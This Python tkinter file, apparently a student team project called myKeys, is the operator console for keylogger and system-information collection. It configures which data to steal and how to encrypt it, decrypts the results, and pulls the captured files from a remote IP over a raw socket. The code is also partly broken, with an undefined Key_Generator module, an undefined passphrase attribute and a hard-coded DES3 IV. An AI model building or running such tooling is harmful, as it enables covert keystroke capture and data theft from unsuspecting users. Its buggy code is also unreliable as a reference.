# Team myKeys
# Team myKeys
# myKeysGUI.py
# Brenden Richardson

#import os
import tkinter as tk
from tkinter import ttk
from tkinter import filedialog as fd
from tkinter import messagebox
import socket
import sys
import Decryot_files
#import Key_Generator
import generateFernetKey
import fernetDecrypt



# des 3
iv = b'\xc3\xd0\xb9\x82\xe7\x902\xe4'

class MyKeysGui(tk.Frame):
    def __init__(self, parent):
        tk.Frame.__init__(self, parent)
        self.parent = parent

        root.title("myKeys")

        # tab setup for configuration and decryption
        tab = ttk.Notebook(parent)
        configTab = ttk.Frame(tab)
        tab.add(configTab, text='Configuration')

        decryptionTab = ttk.Frame(tab)
        tab.add(decryptionTab, text='Decryption')

        downloadTab = ttk.Frame(tab)
        tab.add(downloadTab, text='Download')

        tab.pack(expand=1, fill="both")

        self.pgpEmail = tk.StringVar()
        self.passPhrase = tk.StringVar()
        self.generatedKey = tk.StringVar()
        self.keyVar = tk.StringVar()
        self.fileName = tk.StringVar()
        self.key1 = tk.StringVar()

        ######################################
        # Configuration Tab #
        ######################################

         # Start function
        def startEncryption():
            if (check1.get() == 0) & (check2.get() == 0):
                 messagebox.showwarning('Invalid Entry', 'Must choose at least 1 selection for file retrieval')
            elif (self.eType.get() == "pgp"):
                 pgpEntryEncrypt()
                 if (check1.get() == 1) & (check2.get() == 0):
                     # pgp encryption for system info only
                     configFile = open('config.txt', "w+")

                     configFile.write('PGP\n')
                     configFile.write('1\n')
                     configFile.write('0\n')
                     configFile.write(self.passPhrase.get() + '\n')
                     configFile.write(self.pgpEmail.get())

                     self.generatedKey.set(self.passPhrase.get())
                     configFile.close()

                 elif (check2.get() == 1) & (check1.get() == 0):
                     # pgp encryption for keylogger only
                     configFile = open('config.txt', "w+")

                     configFile.write('PGP\n')
                     configFile.write('0\n')
                     configFile.write('1\n')
                     configFile.write(self.passPhrase.get() + '\n')
                     configFile.write(self.pgpEmail.get())

                     self.generatedKey.set(self.passPhrase.get())
                     configFile.close()

                 elif (check1.get() == 1) & (check2.get() == 1):
                     # pgp encryption for system info and keylogger
                     configFile = open('config.txt', "w+")

                     configFile.write('PGP\n')
                     configFile.write('1\n')
                     configFile.write('1\n')
                     configFile.write(self.passPhrase.get() + '\n')
                     configFile.write(self.pgpEmail.get())

                     self.generatedKey.set(self.passPhrase.get())
                     configFile.close()

            elif (self.eType.get() == "fernet"):
                 if (check1.get() == 1) & (check2.get() == 0):
                     # fernet encryption for system info only
                     configFile = open('config.txt', "w+")

                     configFile.write('Fernet\n')
                     configFile.write('1\n')
                     configFile.write('0\n')
                     self.keyVar = generateFernetKey.Fernet.generate_key()
                     self.generatedKey.set(self.keyVar)
                     configFile.write(self.generatedKey.get())

                     configFile.close()

                 elif (check2.get() == 1) & (check1.get() == 0):
                     #fernet encryption for keylogger only
                     configFile = open('config.txt', "w+")

                     configFile.write('Fernet\n')
                     configFile.write('0\n')
                     configFile.write('1\n')
                     self.keyVar = generateFernetKey.Fernet.generate_key()
                     self.generatedKey.set(self.keyVar)
                     configFile.write(self.generatedKey.get())

                     configFile.close()

                 elif (check1.get() == 1) & (check2.get() == 1):
                     #fernet encryption for system infor and keylogger
                     configFile = open('config.txt', "w+")

                     configFile.write('Fernet\n')
                     configFile.write('1\n')
                     configFile.write('1\n')
                     self.keyVar = generateFernetKey.Fernet.generate_key()
                     self.generatedKey.set(self.keyVar)
                     configFile.write(self.generatedKey.get())

                     configFile.close()

            elif (self.eType.get() == "DES3"):
                 if (check1.get() == 1) & (check2.get() == 0):
                     # DES3 encryption for system info only
                     configFile = open('config.txt', "w+")

                     configFile.write('DES3\n')
                     configFile.write('1\n')
                     configFile.write('0\n')
                     self.keyVar = Key_Generator.DES3_generation()
                     self.generatedKey.set(self.keyVar)
                     configFile.write(self.generatedKey.get())
                     configFile.write(iv)

                     configFile.close()

                 elif (check2.get() == 1) & (check1.get() == 0):
                     # DES3 encryption for keylogger only
                     configFile = open('config.txt', "w+")

                     configFile.write('DES3\n')
                     configFile.write('0\n')
                     configFile.write('1\n')
                     self.keyVar = Key_Generator.DES3_generation()
                     self.generatedKey.set(self.keyVar)
                     configFile.write(self.generatedKey.get())
                     configFile.write(iv)

                     configFile.close()

                 elif (check1.get() == 1) & (check2.get() == 1):
                     # DES3 encryption for system info and keylogger
                     configFile = open('config.txt', "w+")

                     configFile.write('DES3\n')
                     configFile.write('1\n')
                     configFile.write('1\n')
                     self.keyVar = Key_Generator.DES3_generation()
                     self.generatedKey.set(self.keyVar)
                     configFile.write(self.generatedKey.get())
                     configFile.write(iv)

                     configFile.close()

            elif (self.eType.get() == "AES"):
                 if (check1.get() == 1) & (check2.get() == 0):
                     # AES encryption for system info only
                     configFile = open('config.txt', "w+")

                     configFile.write('AES\n')
                     configFile.write('1\n')
                     configFile.write('0\n')
                     self.keyVar = Key_Generator.generate_AES(self)
                     self.generatedKey.set(self.keyVar)
                     configFile.write(self.generatedKey.get())

                     configFile.close()

                 elif (check2.get() == 1) & (check1.get() == 0):
                     # AES encryption for keylogger only
                     configFile = open('config.txt', "w+")

                     configFile.write('AES\n')
                     configFile.write('0\n')
                     configFile.write('1\n')
                     self.keyVar = Key_Generator.generate_AES(self)
                     self.generatedKey.set(self.keyVar)
                     configFile.write(self.generatedKey.get())

                     configFile.close()

                 elif (check1.get() == 1) & (check2.get() == 1):
                     # AES encryption for system info and keylogger
                     configFile = open('config.txt', "w+")
                     
                     configFile.write('AES\n')
                     configFile.write('1\n')
                     configFile.write('1\n')
                     self.keyVar = Key_Generator.generate_AES(self)
                     self.generatedKey.set(self.keyVar)
                     configFile.write(self.generatedKey.get())

                     configFile.close()

        # pgp encryption popup window for email and passphrase        
        def pgpEntryEncrypt():
            # pgp entry window enter button function
            def enterBtn():
                pgpKey.destroy()
                pgpKey.update()

            # window creation
            pgpKey = tk.Toplevel(root)
            pgpKey.grab_set()

            pgpKey.title("pgp Entry")

            # email label
            pgpLbl = ttk.Label(pgpKey, text='Email:')
            pgpLbl.pack(expand=1, fill="both")

            # email entry
            pgpEmail = tk.StringVar()
            pgpEmail = ttk.Entry(pgpKey, textvariable=self.pgpEmail)
            pgpEmail.pack(expand=1, fill="both")

            # passphrase label
            pgpLbl2 = ttk.Label(pgpKey, text='Passphrase:')
            pgpLbl2.pack(expand=1, fill="both")

            # passphrase entry
            pgpPass = tk.StringVar()
            pgpPass = ttk.Entry(pgpKey, textvariable=self.passPhrase)
            pgpPass.pack(expand=1, fill="both")

            # enter button
            pgpButton = tk.Button(pgpKey, text='Enter', command=enterBtn)
            pgpButton.pack(expand=1, fill="both")
            
            pgpKey.minsize(250,120)

            # pauses until enter button is pressed
            root.wait_window(pgpKey)

        # encryption type label
        encryptLbl = ttk.Label(configTab, text='Encryption Type')
        encryptLbl.pack(expand=1, fill="both")

        # encryption dropdown menu
        self.eType = tk.StringVar()
        eTypeDrop = ttk.Combobox(configTab, textvariable = self.eType, state='readonly')
        eTypeDrop['values'] = ("pgp", "fernet", "DES3", "AES")
        eTypeDrop.current(0)
        eTypeDrop.pack(expand=1, fill="both")

        # checkbutton label
        checkBLbl = ttk.Label(configTab, text='Select Files to Retrieve')
        checkBLbl.pack(expand=1, fill="both")

        # check variables for system info checkbutton and keylogger checkbutton
        check1 = tk.IntVar()
        check2 = tk.IntVar()

        # checkbutton for system info
        sysButton = ttk.Checkbutton(configTab, text='System Info', variable=check1)
        sysButton.pack(expand=1, fill="both")
        
        # checkbutton for keylogger
        keyLButton = ttk.Checkbutton(configTab, text='Keylogger', variable=check2)
        keyLButton.pack(expand=1, fill="both")

        # button to start program
        startButton = tk.Button(configTab, text='Start', command=startEncryption)
        startButton.pack(expand=1, fill="both")

        # label for generated key
        keyGenLbl = ttk.Label(configTab, text='Generated Key:')
        keyGenLbl.pack(expand=1, fill="both")
        
        # decryption key
        decryptKeyLbl = ttk.Label(configTab,background="white", textvariable=self.generatedKey)
        decryptKeyLbl.pack(expand=1, fill="both")

        ######################################
        # Decryption Tab #
        ######################################

        def startDecryption():

        ##### INSTANTIATE LOCAL VARIABLES: #####
            
        # email and passphrase: drawn from pgp dialog
            email1 = self.pgpEmail
            passphrase1 = self.passPhrase

            if (self.dType.get() == "pgp"):
                # pgp decryption
                pgpEntryDecrypt()

                ###TO-DO: CALL PGP DECRPYT FUNCTION###
                
                Decryot_files.decrypt_pgp(self.passphrase1.get(), self.fileName.get())

            elif (self.dType.get() == "fernet"):
                # fernet decryption
                fernetDecrypt.decrypt(self.key1.get(), self.fileName.get())


            elif (self.dType.get() == "DES3"):
                # DES3 decryption
                Decryot_files.des3_decrypt(self.key1.get(), self.fileName.get(), iv)
                # TO-DO: check it is the right keyy
                # CALL DES3 DECRYPT FUNCTION###

            elif (self.dType.get() == "AES"):
                # AES decryption
                Decryot_files.decrypt_aes(self.key1.get(), self.fileName.get())
                ###TO-DO: CALL AES DECRYPT FUNCTION##
                

        # pgp decryption popup window for email and passphrase
        def pgpEntryDecrypt():
            # pgp entry window enter button function
            def startBtn():
                pgpKey.destroy()
                pgpKey.update()

            # window creation
            pgpKey = tk.Toplevel(root)
            pgpKey.grab_set()

            pgpKey.title("pgp Entry")

            # email label
            pgpLbl = ttk.Label(pgpKey, text='Email:')
            pgpLbl.pack(expand=1, fill="both")

            # email entry
            pgpEmail = tk.StringVar()
            pgpEmail = ttk.Entry(pgpKey, textvariable=self.pgpEmail)
            pgpEmail.pack(expand=1, fill="both")

            # passphrase label
            pgpLbl2 = ttk.Label(pgpKey, text='Passphrase:')
            pgpLbl2.pack(expand=1, fill="both")

            # passphrase entry
            pgpPass = tk.StringVar()
            pgpPass = ttk.Entry(pgpKey, textvariable=self.passPhrase)
            pgpPass.pack(expand=1, fill="both")

            # enter button
            pgpButton = tk.Button(pgpKey, text='Enter', command=startBtn)
            pgpButton.pack(expand=1, fill="both")
            
            pgpKey.minsize(250,120)

            # pauses until enter button is pressed
            root.wait_window(pgpKey)

        def checkDropdown(event):
            if(self.dType.get() == "pgp"):
                keyEntry.delete(0, 'end')
                keyEntry.config(state='disabled')
            else:
                 keyEntry.delete(0, 'end')
                 keyEntry.config(state='enabled')

        # file dialog function
        #def callFile():
            #callFileName = fd.askopenfilename(filetypes = (("text files", "*.txt"),("all files", "*.*")))
            #self.fileName.set(callFileName)

        # file name label
        fileLbl = ttk.Label(decryptionTab, text='Enter File Name')
        fileLbl.pack(expand=1, fill="both")

        # file name entry
        fileEntr = tk.Entry(decryptionTab, textvariable=self.fileName)
        fileEntr.pack(expand=1, fill="both")
        
        # decryption type label
        decryptLbl = ttk.Label(decryptionTab, text='Decryption Type')
        decryptLbl.pack(expand=1, fill="both")

        # decryption dropdown menu
        self.dType = tk.StringVar()
        dTypeDrop = ttk.Combobox(decryptionTab, textvariable = self.dType, state='readonly')
        dTypeDrop['values'] = ("pgp", "fernet","DES3", "AES")
        dTypeDrop.current(0)
        dTypeDrop.pack(expand=1, fill="both")
        dTypeDrop.bind("<<ComboboxSelected>>", checkDropdown)

        # decrytion key label
        decryptKeylbl = ttk.Label(decryptionTab, text='Enter Decryption Key')
        decryptKeylbl.pack(expand=1, fill="both")

        # decryption key entry box
        keyEntry = ttk.Entry(decryptionTab, textvariable=self.key1, state='disabled')
        keyEntry.pack(expand=1, fill="both")

        # decryption start button
        decryptStartButton = tk.Button(decryptionTab, text='Start', command=startDecryption)
        decryptStartButton.pack(expand=1, fill="both")

        ######################################
        # Download tab #
        ######################################
        buffer_size = 1024
        server_port = 25006
        fileName = tk.StringVar()
        ipVar = tk.StringVar()
        fileName = tk.StringVar()
        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


        def connect():
            dirInfo.config(text="Establishing connection...")
            clientsocket.connect((ipVar.get(), server_port))
            data = clientsocket.recv(buffer_size)
            dirInfo.config(text=data.decode())
        def disconnect():
            sent_data = "quit"
            clientsocket.send(sent_data.encode())
            dirInfo.config(text="Connection closed.")
            clientsocket.close()
            root.destroy()
        
        def pull_file():
            sent_data = ("pull" + fileName.get())
            clientsocket.send(sent_data.encode())
            status = clientsocket.recv(buffer_size)
            if status.decode() == "failure":
                dirInfo.config(text="Failed to retreive file.")
            elif status.decode() == "success":
                dirInfo.config(text="Downloading file...")
                f = open (fileName.get(), 'wb')
                l = clientsocket.recv(buffer_size)
                while(l):
                    sent_data = "received".encode()
                    clientsocket.send(sent_data)
                    if (l.decode()[0:3] == "eof"):
                        break
                    elif (l.decode()[0:3] == "con"):
                        l = l[3:]
                        f.write(l)
                        l = clientsocket.recv(buffer_size)
                f.close()
                dirInfo.config(text = "Completed file transfer.")
                return
            else:
                dirInfoLbl.config(text="Received unexpected message.")


        # IP label
        ipLbl = ttk.Label(downloadTab, text='Enter IP Address')
        ipLbl.pack(expand=1, fill="both")

        # IP entry field
        ipEntry = tk.Entry(downloadTab, textvariable=ipVar)
        ipEntry.pack(expand=1, fill="both")

        # connect button
        connectButton = tk.Button(downloadTab, text='Connect', command=connect)
        connectButton.pack(expand=1, fill="both")

        #disconnect button
        disconnectButton = tk.Button(downloadTab, text='Disconnect + Quit', command=disconnect)
        disconnectButton.pack(expand=1, fill="both")

        # directory info label
        dirInfoLbl = ttk.Label(downloadTab, text='Server Message')
        dirInfoLbl.pack(expand=1, fill="both")

        # display for directory information
        dirInfo = tk.Label(downloadTab, background="white", text='')
        dirInfo.pack(expand=1, fill="both")

        # file name label
        fileNameLbl = ttk.Label(downloadTab, text='Name of File')
        fileNameLbl.pack(expand=1, fill="both")

        # file name entry
        fileNameEntry = tk.Entry(downloadTab, textvariable=fileName)
        fileNameEntry.pack(expand=1, fill="both")

        # download button
        downloadButton = tk.Button(downloadTab, text='Download', command=pull_file)
        downloadButton.pack(expand = 1, fill = "both")

        # window constraints
        parent.minsize(250,150)
        # parent.maxsize(300,200)       

        
if __name__ == "__main__":
    root = tk.Tk()
    MyKeysGui(root).pack(side="top", fill="both", expand=True)
    root.mainloop()
